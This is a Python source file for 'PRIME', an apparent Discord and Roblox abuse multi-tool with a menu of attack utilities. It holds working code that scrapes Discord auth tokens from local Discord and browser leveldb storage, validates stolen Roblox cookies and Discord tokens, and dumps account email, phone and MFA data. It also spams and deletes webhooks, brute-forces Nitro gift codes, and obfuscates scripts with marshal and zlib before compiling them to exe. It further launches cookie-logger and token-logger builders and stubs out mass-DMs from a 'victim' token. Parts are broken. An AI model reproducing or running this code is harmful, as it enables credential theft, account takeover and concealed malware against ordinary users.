import time
import colorama
from colorama import Fore 
import marshal
import zlib
import requests
from pystyle import *
import os
from pystyle import Colors, Colorate
import threading
import random
import requests
import sys
import shutil
import random
import string
import webbrowser
import subprocess
from itertools import cycle
import base64
from random import randint
import re
from base64 import b64encode
import httpx



print(Fore.LIGHTGREEN_EX + "")
print("Starting PRIME [|]")
time.sleep(0.2)
os.system("cls")
print("Starting PRIME [/]")
time.sleep(0.2)
os.system("cls")
print("Starting PRIME [-]")
time.sleep(0.2)
os.system("cls")
print("Starting PRIME [\\]")
time.sleep(0.2)
os.system("cls")
print("Starting PRIME [|]")
time.sleep(0.2)
os.system("cls")
print("Starting PRIME [/]")
time.sleep(0.2)
os.system("cls")
print("Starting PRIME [-]")
time.sleep(0.2)
os.system("cls")
print("Starting PRIME [\\]")
time.sleep(0.2)
os.system("cls")
print("Starting PRIME [|]")
time.sleep(0.2)
print(chr(27)+'[2j')
print('\033c')
print('\x1bc')
pass
banner = """
       Devved By: synthetic#7187

       ██████╗░██████╗░██╗███╗░░░███╗███████╗
       ██╔══██╗██╔══██╗██║████╗░████║██╔════╝
       ██████╔╝██████╔╝██║██╔████╔██║█████╗░░
       ██╔═══╝░██╔══██╗██║██║╚██╔╝██║██╔══╝░░
       ██║░░░░░██║░░██║██║██║░╚═╝░██║███████╗
       ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝╚══════╝
"""
banner1 = """
  [1] Credits            [2] Webhook Spammer
  [3] Webhook Deleter    [4] Webhook Check
  [5] Proxy Scraper      [6] Python Obfuscation
  [7] NitroGen and check [8] Roblox Cookie Checker
  [9] Token Info         [10] Token MassDM
  [11] Pin Cracker       [12] Cookie Logger Builder
  [13] TokenLogger Build [14] Token Finder
  [15] Half Token Find   [16] Email Spammer
  [17] Token gen         [18] Prime
"""
def main():
  pass
print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner)))
banner2 = ("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner2)))
print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner1)))
print("")
choice = int(input(f"                                   {Colors.green} [+] > "))

if choice == 1:
  print("Devved By: synthetic#7187")
  print("If u bought this, you got scammed :skull:")
  time.sleep(5)
  os.system("python essentials/m.py")
elif choice == 2:
    webhook = input("[+] Enter your webhook > ")
    message = input("[+] Enter The Message > ")
    try:
        while True:
            try:
                time.sleep(0.3)
                data = requests.post(webhook, json={"content" : message})
                if data.status_code == 204:
                    print("[+] Sent [" + message +"]")
            except:
                print("Error")
                time.sleep(5)
                main()
    except KeyboardInterrupt:
        print("Succesfully Spammed The Webhook")
        time.sleep(2)
        os.system("python m.py")
elif choice == 3:
    webhook = input("[+] Enter Webhook > ")
    deletehook = requests.delete(webhook)
    the = requests.get(webhook)
    if the.status_code == 404:
      print(Fore.GREEN + "[+] Webhook Deleted")
    os.system("python m.py")

elif choice == 4:
   webhook= input("[+] Enter Webhook > ")
   r = requests.get(webhook)
   if r.status_code == 200:
    print(Fore.GREEN + "Webhook Is Working")
    time.sleep(2)
    main(s)
   else:
        input(Fore.RED + 'Webhook Is Not Working.')
        time.sleep(2)
        os.system("python m.py")
elif choice == 5:
    os.system('cls' if os.name == 'nt' else 'clear')
    http = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=http&ssl=yes','https://api.proxyscrape.com/?request=displayproxies&proxytype=https&ssl=yes','https://sheesh.rip/new.txt','https://www.proxy-list.download/api/v1/get?type=https','https://www.proxy-list.download/api/v1/get?type=http','https://spys.me/proxy.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt','https://raw.githubusercontent.com/RX4096/proxy-list/main/online/all.txt','https://raw.githubusercontent.com/almroot/proxylist/master/list.txt']
    s4 = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&ssl=yes','https://www.proxy-list.download/api/v1/get?type=socks4','https://spys.me/socks.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks4.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt']
    s5 = ['https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&ssl=yes','https://www.proxy-list.download/api/v1/get?type=socks5','https://spys.me/socks.txt','https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt','https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt']
    try:
        os.remove('http.txt')
        os.remove('socks4.txt')
        os.remove('socks5.txt')
    except:
        pass
    for src in http:
        r = httpx.get(src)
        with open("http.txt", "a") as file:
            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
                proxies = proxy[0] + ':' + proxy[1] + '\n'
                file.write(proxies)
    print('HTTP Scraped')
    for src in s4:
        r = httpx.get(src)
        with open("socks4.txt", "a") as file:
            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
                proxies = proxy[0] + ':' + proxy[1] + '\n'
                file.write(proxies)
    print('SOCKS4 Scraped')
    for src in s5:
        r = httpx.get(src)
        with open("socks5.txt", "a") as file:
            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), r.text):
                proxies = proxy[0] + ':' + proxy[1] + '\n'
                file.write(proxies)
    print('SOCKS5 Scraped')
    time.sleep(2)
    os.system("python m.py")


if choice == 6:
       os.system("title Simple-OBF: simplest marshal python obfuscator out there")
       pythonfile = input("python file name that you want to obf > ")
       with open(f'{pythonfile}.py') as fi:
              pro = fi.read()
              mar = marshal.dumps(pro)
              zlb = zlib.compress(mar)
              with open(f"{pythonfile}.py", 'w') as f:
                     f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")

       print("finished")
       time.sleep(2)
       exe = input("Compile to exe press enter to continue > ")
       os.system(f'pyinstaller --onefile {pythonfile}.py')
if choice == 7: 
    amt = input("[+] Amount? > ")
    os.system('cls')         
    for i in range(int(amt)):
        code = ('').join(random.choices(string.ascii_letters + string.digits, k=16))
        r = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true")
        if r.status_code == 200:
            print(Fore.GREEN + f"  [+]Valid Nitro Code > discord.gift/{code} - {i}")
        else:
            print(Fore.RED + f"  [!] Invalid > discord.gift/{code}  -  {i}")  
    ext11 = input("\nPress ENTER to exit > ") #exit
    if ext11 == "":
        main(s)
    else:
        print(Fore.WHITE + "")
        os.system("python essentials/m.py")

if choice == 8:
    cookie = input("Enter Roblox Cookie: ")
    try:
        r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
        print("Cookie Is Valid")
        try:
            print("Acount User Id: " +  str(r["UserID"]))
        except Exception:
            print("Acount User Id: ERROR")
        try:
            print("Acount Username: " +  str(r["UserName"]))
        except Exception:
            print("Acount Username: ERROR")
        try:    
            print("Robux Balance: " +  str(r["RobuxBalance"]))
        except Exception:
            print("Robux Balance: ERROR")
        try:    
            print("Account Picture: " +  str(r["ThumbnailUrl"]))
        except Exception:
            print("Account Picture: ERROR")
        try:    
            print("Builders Club Member: " +  str(r["IsAnyBuildersClubMember"]))
        except Exception:
            print("Builders Club Member: ERROR")
        try:    
            print("Premium: " +  str(r["IsPremium"]))
        except Exception:
            print("Premium: ERROR")
        while True:
            save = input("Wanna Save Info In A Txt File (y/n): ")
            if save == "y" or save == "n":
                break
            else:
                print("Enter A Valid Choice")
        if save == "y":
            file = open(str(r["UserName"])+".txt", "a")
            try:
                file.write("Acount User Id: " +  str(r["UserID"]) + "\n")
            except Exception:
                file.write("Acount User Id: ERROR" + "\n")
            try:
                file.write("Acount Username: " +  str(r["UserName"]) + "\n")
            except Exception:
                file.write("Acount Username: ERROR" + "\n")
            try:    
                file.write("Robux Balance: " +  str(r["RobuxBalance"]) + "\n")
            except Exception:
                file.write("Robux Balance: ERROR" + "\n")
            try:    
                file.write("Account Picture: " +  str(r["ThumbnailUrl"]) + "\n")
            except Exception:
                file.write("Account Picture: ERROR" + "\n")
            try:    
                file.write("Builders Club Member: " +  str(r["IsAnyBuildersClubMember"]) + "\n")
            except Exception:
                file.write("Builders Club Member: ERROR" + "\n")
            try:    
                file.write("Premium: " +  str(r["IsPremium"]) + "\n")
            except Exception:
                file.write("Premium: ERROR" + "\n")
            file.close()
            print("Succsesfully Saved")
            input("")
            os.system("python essentials/m.py")
    except Exception:
        print("Cookie Invalid")
        input("")
        os.system("python essentials/m.py")
if choice == 9:
    os.system('cls; clear')
    print('TOKEN INFO: \n')
    token = input('Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
      print('\n - Token is valid - ')
      userName = r.json()['username'] + '#' + r.json()['discriminator']
      userID = r.json()['id']
      phone = r.json()['phone']
      email = r.json()['email']
      mfa = r.json()['mfa_enabled']
      verified = r.json()['verified']
      print(f'''
User: {userName}
ID: {userID}
Phone: {phone}
Email: {email}
MFA: {mfa}
Verified: {verified}
Token: {token}
            ''')
      print('\nPress [Enter] key to go back to Main Menu.')
      while True:
          main(s)
          os.system('cls; clear')
    else:
      print('\nInvalid token')
      print('\nPress [Enter] key to go back to Main Menu.')
      main(s)
      os.system('cls; clear')
      os.system("python m.py")
if choice == 10:
  token = input('Victims token to mass dm >')

  async def massdm(token):
    for friend in client.user.friends:
        try:
            embed = discord.Embed(title='`nuked by AZURA MULTI`', color=0xf3c300, description= f'''{content} \n `>:D`''')
            embed.set_footer(text="AZURA ON TOP ;;🎸")
            await friend.send(embed=embed)
            print('{0} Massed'.format(friend.name))
        except:
            pass
    print('Finished')
    os.system("python essentials/m.py")

if choice == 11:
  os.system("python essentials/crack.py")
  


if choice == 12:
  os.system("python essentials/cookiebuilder.py")


if choice == 11:
   print("coming soon..")
   time.sleep(5)
   os.system("python essentials/m.py")
       
if choice == 14:
 def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

 def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                print(token)
        else:
            print('done finding tokens')
            wait = input("Press Enter To Exit")
            os.system("python essentials/m.py")
if choice == 15:
  i = True
  n = True

  class token:
    def __init__(self, ID):
        self.Token = b64encode(bytes(ID, 'utf-8'))
        self.Token = self.Token.decode("utf-8")

  while i:
    Answer = token(input("Enter the ID > "))
    print('half of their token is >', Answer.Token)
    while n:
        loop = input('[+] press enter to exit > ')

        os.system("python essentials/m.py")


if choice == 16:
  print("not working") 
  time.sleep(5)
  os.system("python essentials/m.py")



if choice == 17:
  os.system("cls")     
  os.system("python essentials/tokengen.py")
